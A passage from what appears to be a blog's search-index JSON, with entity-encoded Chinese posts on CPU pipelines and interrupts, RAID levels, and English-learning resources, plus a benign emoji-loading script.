&#x6BB5;&#x7684;&#x6D41;&#x6C34;&#x7EBF;&#x7684;&#x901F;&#x5EA6;&#x4E0E;&#x7B49;&#x529F;&#x80FD;&#x7684;&#x975E;&#x6D41;&#x6C34;&#x7EBF;&#x7684;&#x901F;&#x5EA6;&#x4E4B;&#x6BD4; &#x6548;&#x7387; &#x6D41;&#x6C34;&#x7EBF;&#x4E2D;&#x5404;&#x529F;&#x80FD;&#x6BB5;&#x7684; &#x5229;&#x7528;&#x7387; &#x6D41;&#x6C34;&#x7EBF;&#x7684;&#x591A;&#x53D1;&#x6280;&#x672F; &#x8D85;&#x6807;&#x91CF;&#x6280;&#x672F;&#x3001;&#x8D85;&#x6D41;&#x6C34;&#x7EBF;&#x6280;&#x672F;&#x3001;&#x8D85;&#x957F;&#x6307;&#x4EE4;&#x5B57;&#x6280;&#x672F; &#x6D41;&#x6C34;&#x7EBF;&#x7ED3;&#x6784; &#x6307;&#x4EE4;&#x6D41;&#x6C34;&#x7EBF;&#x7ED3;&#x6784; &#x8FD0;&#x7B97;&#x6D41;&#x6C34;&#x7EBF; &#x4E2D;&#x65AD;&#x8BF7;&#x6C42; &#x4E2D;&#x65AD;&#x8BF7;&#x6C42;&#x6807;&#x8BB0;&#x3001;&#x4E2D;&#x65AD;&#x5224;&#x4F18;&#x903B;&#x8F91;&#x3001;&#xFF08;&#x786C;&#x4EF6;&#x6392;&#x961F;&#x3001;&#x8F6F;&#x4EF6;&#x6392;&#x961F;&#xFF09; &#x4E2D;&#x65AD;&#x54CD;&#x5E94; &#x54CD;&#x5E94;&#x4E2D;&#x65AD;&#x7684;&#x6761;&#x4EF6;&#xFF1A;&#x5141;&#x8BB8;&#x4E2D;&#x65AD;&#x89E6;&#x53D1;&#x5668; EINT = 1 &#x54CD;&#x5E94;&#x4E2D;&#x65AD;&#x7684; &#x65F6;&#x95F4;&#xFF1A;&#x6307;&#x4EE4;&#x6267;&#x884C;&#x5468;&#x671F;&#x7ED3;&#x675F;&#x65F6;&#x523B;&#x7531;CPU&#x53D1;&#x67E5;&#x8BE2;&#x4FE1;&#x53F7; &#x4E2D;&#x65AD;&#x9690;&#x6307;&#x4EE4; 1.&#x4FDD;&#x62A4;&#x7A0B;&#x5E8F;&#x65AD;&#x70B9; 2.&#x5BFB;&#x627E;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x5165;&#x53E3;&#x5730;&#x5740; 3.&#x786C;&#x4EF6; &#x5173;&#x4E2D;&#x65AD; &#x4FDD;&#x62A4;&#x73B0;&#x573A;&#x548C;&#x6062;&#x590D;&#x73B0;&#x573A; &#x7A0B;&#x5E8F;&#x65AD;&#x70B9;&#x4FDD;&#x62A4;&#x548C;&#x4FDD;&#x62A4;CPU&#x5185;&#x90E8;&#x4E2A;&#x5BC4;&#x5B58;&#x5668;&#x5185;&#x5BB9; &#x4E2D;&#x65AD;&#x5C4F;&#x853D;&#x6280;&#x672F; 1.&#x591A;&#x91CD;&#x4E2D;&#x65AD;&#x7684;&#x6982;&#x5FF5; 2.&#x5B9E;&#x73B0;&#x591A;&#x91CD;&#x4E2D;&#x65AD;&#x7684;&#x6761;&#x4EF6; 1).&#x63D0;&#x524D;&#x8BBE;&#x7F6E;&#x201C;&#x5F00;&#x4E2D;&#x65AD;&#x201D;&#x6307;&#x4EE4; 2).&#x4F18;&#x5148;&#x7EA7;&#x522B;&#x9AD8;&#x7684;&#x4E2D;&#x65AD;&#x6E90;&#x6709;&#x6743;&#x4E2D;&#x65AD;&#x4F18;&#x5148;&#x7EA7;&#x522B;&#x4F4E;&#x7684;&#x4E2D;&#x65AD;&#x6E90; 3.&#x5C4F;&#x853D;&#x6280;&#x672F; 1).&#x5C4F;&#x853D;&#x89E6;&#x53D1;&#x5668;&#x548C;&#x5C4F;&#x853D;&#x5B57; 2).&#x5C4F;&#x853D;&#x6280;&#x672F;&#x53EF;&#x6539;&#x53D8;&#x4F18;&#x5148;&#x7B49;&#x7EA7; 3).&#x5C4F;&#x853D;&#x6280;&#x672F;&#x7684;&#x5176;&#x4ED6;&#x5E94;&#x7528; 4.&#x591A;&#x91CD;&#x4E2D;&#x65AD;&#x7684;&#x65AD;&#x70B9;&#x4FDD;&#x62A4; &#x4E5D; &#x63A7;&#x5236;&#x5355;&#x5143;&#x529F;&#x80FD; &#x53D6;&#x503C;&#x5468;&#x671F; PC-&gt;MAR 1-&gt;R M(MAR)-&gt;MDR MDR-&gt;IR OP(IR)-&gt;CU (PC)+1-&gt;PC &#x95F4;&#x5740;&#x5468;&#x671F; Ad(IR)-&gt;MAR 1-&gt;R M(MAR)-&gt;MDR MDR-&gt;Ad(IR) &#x6267;&#x884C;&#x5468;&#x671F; &#x6307;&#x4EE4;&#x7C7B;&#x522B; &#x6B65;&#x9AA4; &#x975E;&#x8BBF;&#x5B58;&#x6307;&#x4EE4; 0-&gt;ACC&#x3001;ACC&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;ACC&#xAF;-&gt;ACC&#x3001;L(ACC)-&gt;R(ACC),ACC0ACC0-&gt;ACC0ACC0&#x3001;R(ACC)-&gt;L(ACC),ACC0ACC0-&gt;ACC0ACC0&#x3001;0-&gt;G &#x8BBF;&#x5B58;&#x6307;&#x4EE4;-&#x52A0;&#x6CD5;&#x6307;&#x4EE4; ADD X&#x3001;Ad(IR)-&gt;MAR&#x3001;1-&gt;R&#x3001;M(MAR)-&gt;MDR&#x3001;(ACC)+(MDR)-&gt;ACC &#x8BBF;&#x5B58;&#x6307;&#x4EE4;-&#x5B58;&#x6570;&#x6307;&#x4EE4; STA X&#x3001;Ad(IR)-&gt;MAR&#x3001;1-&gt;W&#x3001;ACC-&gt;MDR&#x3001;MDR-&gt;M(MAR) &#x8BBF;&#x5B58;&#x6307;&#x4EE4;-&#x53D6;&#x6570;&#x6307;&#x4EE4; LDA x&#x3001;Ad(IR)-&gt;MAR&#x3001;1-&gt;R&#x3001;M(MAR)-&gt;MDR&#x3001;MDR-ACC &#x8F6C;&#x79FB;&#x6307;&#x4EE4;-&#x65E0;&#x6761;&#x4EF6;&#x8F6C;&#x79FB; JMP x&#x3001;Ad(IR)-&gt;PC &#x8F6C;&#x79FB;&#x6307;&#x4EE4;-&#x6761;&#x4EF6;&#x8F6C;&#x79FB; BAN X(&#x8D1F;&#x5219;&#x8F6C;)&#x3001;A0&#x2217;Ad(IR)+A0&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;(PC)&#x2212;&gt;PCA0&#x2217;Ad(IR)+A0&#xAF;(PC)&#x2212;&gt;PC &#x4E2D;&#x65AD;&#x5468;&#x671F; 0-&gt;MAR 1-&gt;W PC-&gt;MDR MDR-&gt;M(MAR) &#x4E2D;&#x65AD;&#x7A0B;&#x5E8F;&#x8BC6;&#x522B;&#x7A0B;&#x5E8F;&#x5165;&#x53E3;&#x5730;&#x5740;M-&gt;PC 0-&gt;EINT &#x63A7;&#x5236;&#x65B9;&#x5F0F; &#x63A7;&#x5236;&#x65B9;&#x5F0F; &#x89E3;&#x91CA; &#x540C;&#x6B65;&#x63A7;&#x5236;&#x65B9;&#x5F0F; &#x4EFB;&#x4E00;&#x5FAE;&#x64CD;&#x4F5C;&#x5747;&#x7531;&#x7EDF;&#x4E00;&#x57FA;&#x51C6;&#x65F6;&#x6807;&#x7684;&#x65F6;&#x5E8F;&#x4FE1;&#x53F7;&#x63A7;&#x5236; &#x5F02;&#x6B65;&#x63A7;&#x5236;&#x65B9;&#x5F0F; &#x65E0;&#x57FA;&#x51C6;&#x65F6;&#x6807;&#x4FE1;&#x53F7;&#x3001;&#x65E0;&#x56FA;&#x5B9A;&#x7684;&#x5468;&#x671F;&#x8282;&#x62CD;&#x548C;&#x4E25;&#x683C;&#x7684;&#x65F6;&#x949F;&#x540C;&#x6B65;&#x3001;&#x91C7;&#x7528; &#x5E94;&#x7B54;&#x65B9;&#x5F0F; &#x8054;&#x5408;&#x63A7;&#x5236;&#x65B9;&#x5F0F; &#x540C;&#x6B65;&#x4E0E;&#x5F02;&#x6B65;&#x76F8;&#x7ED3;&#x5408; &#x4EBA;&#x5DE5;&#x63A7;&#x5236;&#x65B9;&#x5F0F; Reset&#x3001;&#x8FDE;&#x7EED;&#x548C;&#x5355;&#x6761;&#x6307;&#x4EE4;&#x6267;&#x884C;&#x8F6C;&#x6362;&#x5F00;&#x5173;&#x3001;&#x7B26;&#x5408;&#x505C;&#x673A;&#x5F00;&#x5173; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"RAID磁盘阵列技术介绍","date":"2018-08-31T08:33:36.000Z","path":"/posts/fa8e89f7/","text":"&#x524D;&#x8A00;RAID&#xFF08;&#x72EC;&#x7ACB;&#x5197;&#x4F59;&#x78C1;&#x76D8;&#x9635;&#x5217;&#xFF09;&#x6280;&#x672F;&#x662F;&#x901A;&#x8FC7;&#x628A;&#x591A;&#x4E2A;&#x786C;&#x76D8;&#x8BBE;&#x5907;&#x7EC4;&#x5408;&#x6210;&#x4E00;&#x4E2A;&#x5BB9;&#x91CF;&#x5927;&#x3001;&#x5B89;&#x5168;&#x6027;&#x66F4;&#x597D;&#x7684;&#x78C1;&#x76D8;&#x9635;&#x5217;&#xFF0C;&#x5E76;&#x628A;&#x6570;&#x5207;&#x5272;&#x6210;&#x591A;&#x4E2A;&#x5206;&#x533A;&#x6BB5;&#x540E;&#x5206;&#x522B;&#x5B58;&#x653E;&#x5728;&#x5404;&#x4E2A;&#x4E0D;&#x540C;&#x7684;&#x7269;&#x7406;&#x786C;&#x76D8;&#x8BBE;&#x5907;&#x4E0A;&#xFF0C;&#x7136;&#x540E;&#x5229;&#x7528;&#x5206;&#x6563;&#x8BFB;&#x5199;&#x6280;&#x672F;&#x6765;&#x63D0;&#x5347;&#x78C1;&#x76D8;&#x9635;&#x5217;&#x6574;&#x4F53;&#x7684;&#x6027;&#x80FD;&#xFF0C;&#x540C;&#x4E8B;&#x5427;&#x591A;&#x4E2A;&#x91CD;&#x8981;&#x6570;&#x636E;&#x7684;&#x526F;&#x672C;&#x540C;&#x6B65;&#x5230;&#x4E0D;&#x540C;&#x7684;&#x7269;&#x7406;&#x8BBE;&#x5907;&#x4E0A;&#x3002;RAID&#x6280;&#x672F;&#x5177;&#x6709;&#x975E;&#x5E38;&#x597D;&#x7684;&#x6570;&#x636E;&#x5197;&#x4F59;&#x5907;&#x4EFD;&#x529F;&#x80FD;&#xFF0C;&#x4F46;&#x5B83;&#x4E5F;&#x76F8;&#x5E94;&#x5730;&#x63D0;&#x9AD8;&#x4E86;&#x6210;&#x672C;&#x652F;&#x51FA;&#x3002; &#x76EE;&#x524D;&#x5DF2;&#x6709;&#x7684;RAID&#x78C1;&#x76D8;&#x9635;&#x5217;&#x65B9;&#x6848;&#x81F3;&#x5C11;&#x6709;&#x5341;&#x51E0;&#x79CD;&#xFF0C;&#x6700;&#x5E38;&#x89C1;&#x7684;&#x6709;RAID0&#x3001;RAID1&#x3001;RAI5&#x548C;RAID10&#x8FD9;&#x51E0;&#x79CD;&#x3002; RAID 0RAID0&#x662F;&#x628A;&#x591A;&#x5757;&#x7269;&#x7406;&#x786C;&#x76D8;&#xFF08;&#x81F3;&#x5C11;&#x4E24;&#x5757;&#xFF09;&#x901A;&#x8FC7;&#x786C;&#x4EF6;&#x6216;&#x8F6F;&#x4EF6;&#x7684;&#x65B9;&#x5F0F;&#x4E32;&#x8054;&#x5728;&#x4E00;&#x8D77;&#xFF0C;&#x7EC4;&#x6210;&#x4E00;&#x4E2A;&#x5927;&#x7684;&#x5377;&#x7EC4;&#xFF0C;&#x5E76;&#x5C06;&#x6570;&#x636E;&#x4F9D;&#x6B21;&#x5199;&#x5165;&#x5230;&#x5404;&#x4E2A;&#x7269;&#x7406;&#x786C;&#x76D8;&#x4E2D;&#x3002;RAID0&#x80FD;&#x591F;&#x6709;&#x6548;&#x7684;&#x63D0;&#x5347;&#x786C;&#x76D8;&#x6570;&#x636E;&#x7684;&#x541E;&#x5410;&#x901F;&#x5EA6;&#xFF0C;&#x4F46;&#x662F;&#x4E0D;&#x5177;&#x5907;&#x6570;&#x636E;&#x4FEE;&#x590D;&#x548C;&#x9519;&#x8BEF;&#x4FEE;&#x590D;&#x7684;&#x80FD;&#x529B;&#x3002; RAID0 &#x6280;&#x672F;&#x793A;&#x610F;&#x56FE; RAID 1RAID1&#x5B83;&#x662F;&#x628A;&#x4E24;&#x5757;&#x4EE5;&#x4E0A;&#x7684;&#x786C;&#x76D8;&#x8BBE;&#x5907;&#x8FDB;&#x884C;&#x7ED1;&#x5B9A;&#xFF0C;&#x5728;&#x5199;&#x5165;&#x6570;&#x636E;&#x65F6;&#xFF0C;&#x5C06;&#x6570;&#x636E;&#x540C;&#x65F6;&#x5199;&#x5165;&#x5230;&#x591A;&#x5757;&#x786C;&#x76D8;&#x8BBE;&#x5907;&#x4E0A;&#xFF08;&#x53EF;&#x4EE5;&#x5C06;&#x5176;&#x89C6;&#x4E3A;&#x6570;&#x636E;&#x7684;&#x955C;&#x50CF;&#x6216;&#x5907;&#x4EFD;&#xFF09;&#x3002;&#x4F46;&#x5176;&#x4E2D;&#x4E00;&#x5757;&#x786C;&#x76D8;&#x53D1;&#x751F;&#x6545;&#x969C;&#x540E;&#xFF0C;&#x4E00;&#x822C;&#x4F1A;&#x7ACB;&#x5373;&#x81EA;&#x52A8;&#x4EE5;&#x70ED;&#x5907;&#x4EFD;&#x4EA4;&#x6362;&#x7684;&#x65B9;&#x5F0F;&#x6765;&#x6062;&#x590D;&#x6570;&#x636E;&#x7684;&#x6B63;&#x5E38;&#x4F7F;&#x7528;&#x3002; RAID1 RAID1&#x6CE8;&#x91CD;&#x6570;&#x636E;&#x7684;&#x5B89;&#x5168;&#x6027;&#xFF0C;&#x5229;&#x7528;&#x7387;&#x4F4E;&#xFF0C;&#x800C;&#x4E14;&#xFF0C;&#x7531;&#x4E8E;&#x9700;&#x8981;&#x628A;&#x6570;&#x636E;&#x540C;&#x65F6;&#x5199;&#x5165;&#x5230;&#x4E24;&#x5757;&#x4EE5;&#x4E0A;&#x7684;&#x786C;&#x76D8;&#x52A0;&#x4E0A;&#xFF0C;&#x8FD9;&#x65E0;&#x7591;&#x4E5F;&#x5728;&#x4E00;&#x5B9A;&#x7A0B;&#x5EA6;&#x4E0A;&#x589E;&#x52A0;&#x4E86;&#x7CFB;&#x7EDF;&#x6027;&#x80FD;&#x8D1F;&#x8F7D; RAID 5RAID 5&#x6280;&#x672F;&#x5728;&#x7406;&#x8BBA;&#x4E0A;&#x517C;&#x987E;&#x4E86;&#x4E09;&#x8005;&#xFF08;&#x8BFB;&#x5199;&#x901F;&#x5EA6;&#x3001;&#x6570;&#x636E;&#x5B89;&#x5168;&#x6027;&#x3001;&#x6210;&#x672C;&#xFF09;&#xFF0C;&#x4F46;&#x5B9E;&#x9645;&#x4E0A;&#x66F4;&#x50CF;&#x662F;&#x5BF9;&#x8FD9;&#x4E09;&#x8005;&#x7684;&#x201C;&#x76F8;&#x4E92;&#x59A5;&#x534F;&#x201D;&#x3002; RAID5&#x662F;&#x628A;&#x786C;&#x76D8;&#x7684;&#x6570;&#x636E;&#x5947;&#x5076;&#x6821;&#x9A8C;&#x4FE1;&#x606F;&#x4FDD;&#x5B58;&#x5230;&#x5176;&#x4ED6;&#x786C;&#x76D8;&#x4E2D;&#x3002;RAID5&#x78C1;&#x76D8;&#x9635;&#x5217;&#x7EC4;&#x4E2D;&#x6570;&#x636E;&#x7684;&#x5947;&#x5076;&#x6821;&#x9A8C;&#x4FE1;&#x606F;&#x5E76;&#x4E0D;&#x662F;&#x5355;&#x72EC;&#x4FDD;&#x5B58;&#x5230;&#x67D0;&#x4E00;&#x5757;&#x786C;&#x76D8;&#x8BBE;&#x5907;&#x4E2D;&#xFF0C;&#x800C;&#x662F;&#x5B58;&#x50A8;&#x5230;&#x9664;&#x81EA;&#x8EAB;&#x4EE5;&#x5916;&#x7684;&#x5176;&#x4ED6;&#x6BCF;&#x4E00;&#x5757;&#x786C;&#x76D8;&#x4E0A;&#xFF0C;&#x8FD9;&#x6837;&#x7684;&#x597D;&#x5904;&#x662F;&#x5176;&#x4E2D;&#x4EFB;&#x4F55;&#x4E00;&#x5757;&#x8BBE;&#x5907;&#x635F;&#x574F;&#x540E;&#x4E0D;&#x81F3;&#x4E8E;&#x51FA;&#x73B0;&#x81F4;&#x547D;&#x7F3A;&#x9677; RAID 5 &#x56FE;&#x4E2D;Ap ~ Dp&#x90E8;&#x5206;&#x5B58;&#x653E;&#x7684;&#x5C31;&#x662F;&#x6570;&#x636E;&#x7684;&#x5947;&#x5076;&#x6821;&#x9A8C;&#x4FE1;&#x606F; RAID 10&#x9274;&#x4E8E;RAID5&#x6280;&#x672F;&#x662F;&#x56E0;&#x4E3A;&#x786C;&#x76D8;&#x8BBE;&#x5907;&#x7684;&#x6210;&#x672C;&#x95EE;&#x9898;&#x8BFB;&#x8BFB;&#x5199;&#x901F;&#x5EA6;&#x548C;&#x6570;&#x636E;&#x5B89;&#x5168;&#x6027;&#x80FD;&#x6709;&#x4E86;&#x4E00;&#x5B9A;&#x7684;&#x59A5;&#x534F;&#xFF0C;&#x4F46;&#x662F;&#x5927;&#x90E8;&#x5206;&#x4F01;&#x4E1A;&#x66F4;&#x5728;&#x4E4E;&#x7684;&#x662F;&#x6570;&#x636E;&#x672C;&#x8EAB;&#x7684;&#x4EF7;&#x503C;&#x800C;&#x975E;&#x786C;&#x76D8;&#x4EF7;&#x683C;&#xFF0C;&#x56E0;&#x6B64;&#x751F;&#x4EA7;&#x73AF;&#x5883;&#x4E2D;&#x5E38;&#x7528;RAID10&#x6280;&#x672F;&#x3002; RAID 10&#x662F;RAID 1+RAID 0&#x6280;&#x672F;&#x7684;&#x4E00;&#x4E2A;&#x7EC4;&#x5408;&#x4F53;&#x3002; RAID 10 &#x7EC4;&#x5EFA;RAID 10&#x81F3;&#x5C11;&#x9700;&#x8981;4&#x5757;&#x786C;&#x76D8;&#xFF0C;&#x5176;&#x4E2D;&#x5148;&#x5206;&#x522B;&#x5236;&#x4F5C;&#x4E00;&#x5BF9;RAID 1&#xFF0C;&#x4EE5;&#x4FDD;&#x8BC1;&#x6570;&#x636E;&#x7684;&#x5B89;&#x5168;&#x6027;&#xFF1B;&#x7136;&#x540E;&#x518D;&#x4F7F;&#x7528;&#x4E00;&#x5BF9;RAID 0&#x521B;&#x5EFA;RAID 0&#xFF0C;&#x8FDB;&#x4E00;&#x6B65;&#x63D0;&#x9AD8;&#x8BBE;&#x5907;&#x7684;&#x8BFB;&#x5199;&#x901F;&#x5EA6;&#x3002; &#x7406;&#x8BBA;&#x4E0A;&#x6765;&#x8BB2;&#xFF0C;&#x53EA;&#x8981;&#x574F;&#x7684;&#x4E0D;&#x662F;&#x540C;&#x4E00;&#x7EC4;&#x4E2D;&#x7684;&#x6240;&#x6709;&#x786C;&#x76D8;&#xFF0C;&#x90A3;&#x4E48;&#x6700;&#x591A;&#x53EF;&#x4EE5;&#x635F;&#x574F;50%&#x7684;&#x8BBE;&#x5907;&#x800C;&#x4E0D;&#x4E22;&#x5931;&#x6570;&#x636E;&#x3002;&#x7531;&#x4E8E;RAID 10&#x7EE7;&#x627F;&#x4E86;RAID 0&#x7684;&#x9AD8;&#x901F;&#x8BFB;&#x5199;&#x548C;RAID 1&#x7684;&#x6570;&#x636E;&#x5B89;&#x5168;&#x6027;&#xFF0C;&#x5728;&#x4E0D;&#x8003;&#x8651;&#x6210;&#x672C;&#x7684;&#x60C5;&#x51B5;&#x4E0B;RAID 10&#x7684;&#x6027;&#x80FD;&#x90FD;&#x8D85;&#x8FC7;&#x4E86;RAID 5&#x3002; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[{"name":"Linux","slug":"Linux","permalink":"https://marnm.github.io/tags/Linux/"},{"name":"磁盘阵列","slug":"磁盘阵列","permalink":"https://marnm.github.io/tags/磁盘阵列/"},{"name":"RAID 0","slug":"RAID-0","permalink":"https://marnm.github.io/tags/RAID-0/"},{"name":"RAID 1","slug":"RAID-1","permalink":"https://marnm.github.io/tags/RAID-1/"},{"name":"RAID 5","slug":"RAID-5","permalink":"https://marnm.github.io/tags/RAID-5/"},{"name":"RAID 10","slug":"RAID-10","permalink":"https://marnm.github.io/tags/RAID-10/"}]},{"title":"我学练英语所使用的方法、工具与资料","date":"2018-08-23T15:55:04.000Z","path":"/posts/9bf5b5/","text":"&#x539F;&#x6587;&#xFF1A;dramatea &#x8BD5;&#x7528;&#x8FC7;&#x7684;&#x65B9;&#x6CD5;&#xFF08;&#x6309;&#x8FDB;&#x5C55;&#x7684;&#x65F6;&#x95F4;&#x987A;&#x5E8F;&#xFF09;&#x521D;&#x4E2D;&#x9AD8;&#x4E2D;&#x5927;&#x5B66;&#x7684;&#x82F1;&#x8BED;&#x8BFE;&#x5802;&#x4E0E;&#x8003;&#x8BD5;&#x3010;&#x4E0D;&#x5F97;&#x4E0D;&#x627F;&#x8BA4;&#x6211;&#x90A3;&#x53EF;&#x601C;&#x7684;&#x8BED;&#x6CD5;&#x77E5;&#x8BC6;&#x548C;&#x5927;&#x591A;&#x6570;&#x5355;&#x8BCD;&#x90FD;&#x662F;&#x5728;&#x8FD9;&#x4E2A;&#x9636;&#x6BB5;&#x638C;&#x63E1;&#x7684;&#x4F7F;&#x7528;&#x80CC;&#x5355;&#x8BCD;&#x5DE5;&#x5177;&#xFF0C;&#x6309;&#x7167;&#x8BB0;&#x5FC6;&#x66F2;&#x7EBF;&#x6BCF;&#x65E5;&#x6B7B;&#x8BB0;&#x786C;&#x80CC;&#x65B0;&#x8BCD;&#x6216;&#x590D;&#x4E60;&#x65E7;&#x8BCD;&#xFF08;&#x6247;&#x8D1D;&#x6253;&#x5361;&#x8BB0;&#x5F55;&#xFF1A;http://www.shanbay.com/checkin/user/920425/&#x3010;&#x5BF9;&#x4E8E;&#x6211;&#x8FD9;&#x79CD;&#x8BB0;&#x6027;&#x5DEE;&#x7684;&#x4EBA;&#x6B64;&#x6CD5;&#x6548;&#x679C;&#x5F88;&#x4E00;&#x822C;&#x3002;&#x575A;&#x6301;&#x6253;&#x5361;370&#x5929;&#x540E;&#x505C;&#x6B62;&#x4F7F;&#x7528;&#x6247;&#x8D1D;&#x3002;&#x4F46;&#x6362;&#x4E86;&#x4E2A;&#x767E;&#x8BCD;&#x65A9;&#x5076;&#x5C14;&#x518D;&#x80CC;&#x80CC;&#x5355;&#x8BCD;&#x5976;&#x7238;&#x82F1;&#x8BED;&#x6559;&#x5BA4;&#x4E2D;&#x7EA7; http://t.cn/zjSMhMCeasy VOA http://www.easyvoa.com/ &#xFF08;&#x7F8E;&#x56FD;&#x4E4B;&#x97F3;&#xFF0C;&#x6D4B;&#x8BD5;&#x81EA;&#x5DF1;&#x662F;&#x5426;&#x542C;&#x61C2;&#xFF0C;&#x5224;&#x65AD;&#x7EA7;&#x522B;&#xFF08;&#x8BFB;&#x8BB0;&#x2014;&#x2014;&#x6076;&#x9B54;&#x5976;&#x7238;&#x7684;&#x82F1;&#x8BED;&#x5B66;&#x4E60;&#x65B9;&#x6CD5; http://dramatea.com/a/397&#x3010;&#x5B8C;&#x6210;&#x4E86;&#x7B2C;&#x4E00;&#x6B65;&#x9AA4;&#xFF0C;&#x53D1;&#x97F3;&#x7684;&#x7EA0;&#x6B63;&#x3002;&#x540E;&#x6839;&#x636E;&#x81EA;&#x5DF1;&#x7684;&#x60C5;&#x51B5;&#x8C03;&#x6574;&#x540E;&#x7EED;&#x65B9;&#x6CD5;&#x5728;&#x5E94;&#x7528;&#x4E2D;&#x7EC3;&#x4E60;&#xFF08;&#x7EC3;&#x82F1;&#x8BED;&#x957F;&#x77E5;&#x8BC6;&#x4E24;&#x4E0D;&#x8BEF;&#x2460;&#x76F4;&#x63A5;&#x53BB;&#x9605;&#x8BFB;&#x82F1;&#x6587;&#x7684;&#x6587;&#x7AE0;&#x548C;&#x4E66;&#x7C4D;&#xFF0C;&#x4E0D;&#x8BA4;&#x8BC6;&#x7684;&#x5355;&#x8BCD;&#x67E5;&#x8BCD;&#x5178;&#xFF1B;&#x2461;&#x91CD;&#x590D;&#x770B;/&#x542C;&#x82F1;&#x8BED;&#x89C6;&#x9891;&#xFF08;&#x5E26;&#x4E2D;&#x82F1;&#x5B57;&#x5E55;&#xFF09;&#xFF1B;&#xFF08;&#x9700;&#x8981;&#x53D1;&#x97F3;&#x3001;&#x8BCD;&#x6C47;&#x91CF;&#x3001;&#x8BED;&#x6CD5;&#x6709;&#x90A3;&#x4E48;&#x70B9;&#x57FA;&#x7840;&#x3010;&#x4E2D;&#x9636;ing&#x2026; &#x53D1;&#x97F3;&#x7EC3;&#x4E60;&#x97F3;&#x6807;&#x53D1;&#x97F3;&#x7684;&#x6559;&#x7A0B;&#x89C6;&#x9891;&#x548C;flash&#x4EC0;&#x4E48;&#x7684;&#xFF08;&#x597D;&#x65E9;&#x524D;&#x7528;&#x8FC7;&#xFF0C;&#x627E;&#x4E0D;&#x5230;&#x4E86;&#x8D56;&#x4E16;&#x96C4;&#x7F8E;&#x8BED;&#x97F3;&#x6807; http://t.cn/zRtwZA7 &#xFF08;&#x8DDF;&#x7740;&#x8D56;&#x8001;&#x5E08;&#x7684;&#x8BFE;&#x7A0B;&#x7EC3;&#x4E60;&#x53D1;&#x97F3;&#x5C31;&#x597D; &#x8BCD;&#x6C47;Test Your Vocab http://testyourvocab.com&#xFF08;&#x8BCD;&#x6C47;&#x91CF;&#x6D4B;&#x8BD5;&#x6D77;&#x8BCD; http://dict.cn/&#xFF08;&#x8BCD;&#x5178;&#xFF0C;&#x5E38;&#x7528;&#xFF0C;&#x6C49;&#x2192;&#x82F1;&#xFF0C;&#x82F1;&#x2192;&#x6C49;&#x6247;&#x8D1D;&#x7F51; http://shanbay.com &#xFF08;&#x80CC;&#x5355;&#x8BCD;/&#x9605;&#x8BFB;/&#x5C0F;&#x7EC4;&#x5185;&#x4E92;&#x76F8;&#x6FC0;&#x52B1;&#x767E;&#x8BCD;&#x65A9; http://www.baicizhan.com &#xFF08;&#x80CC;&#x5355;&#x8BCD;&#xFF0C;&#x73B0;&#x7528; &#x5206;&#x4EAB;&#x81EA;&#x5236;&#x7684;&#x82F1;&#x8BED;&#x8BCD;&#x6C47;&#x8868;&#xFF1A;&#x4E54;&#x5E03;&#x65AF;2005&#x5E74;&#x5728;&#x65AF;&#x5766;&#x798F;&#x5927;&#x5B66;&#x7684;&#x6F14;&#x8BB2;&#xFF08;224&#x8BCD;&#xFF09; &#x6247;&#x8D1D;&#x5355;&#x8BCD;&#x4E66; / &#x6F14;&#x8BB2;&#x89C6;&#x9891;(&#x4E2D;&#x82F1;&#x5B57;&#x5E55;)TED&#xFF1A;Ernesto Sirolli &#x2013; &#x60F3;&#x8981;&#x5E2E;&#x52A9;&#x522B;&#x4EBA;&#xFF1F;&#x95ED;&#x5634;&#xFF0C;&#x542C;&#x4EBA;&#x5BB6;&#x8BF4;&#xFF01;&#xFF08;546&#x8BCD;&#xFF09;&#x6247;&#x8D1D;&#x5355;&#x8BCD;&#x4E66; / &#x6F14;&#x8BB2;&#x89C6;&#x9891;&#x7535;&#x5F71;&#x300A;Hotel Transylvania&#x300B;(1542&#x8BCD;) &#x5B8C;&#x6574;&#x8BCD;&#x4E32;&#x4E0B;&#x8F7D; / &#x6247;&#x8D1D;&#x8BCD;&#x4E32; / &#x7535;&#x5F71;&#x4ECB;&#x7ECD;&#x8036;&#x9C81;&#x516C;&#x5F00;&#x8BFE;&#xFF1A;&#x7F8E;&#x56FD;&#x73B0;&#x4EE3;&#x4E3B;&#x4E49;&#x6587;&#x5B66;&#x9009;&#x8BFB; &#x7B2C;&#x4E09;&#x8BFE;(1257&#x8BCD;) &#x5B8C;&#x6574;&#x8BCD;&#x4E32;&#x4E0B;&#x8F7D; / &#x8BFE;&#x7A0B;&#x89C6;&#x9891; &#x8BED;&#x6CD5;&#x4E0A;&#x5B66;&#x65F6;&#x7684;&#x82F1;&#x8BED;&#x8001;&#x5E08;&#x4EEC;&#x7684;&#x558B;&#x558B;&#x4E0D;&#x4F11;&#x8F9B;&#x52E4;&#x4F20;&#x6388;&#x8BED;&#x6CD5;&#x4E66; &#x9605;&#x8BFB;The Little Prince 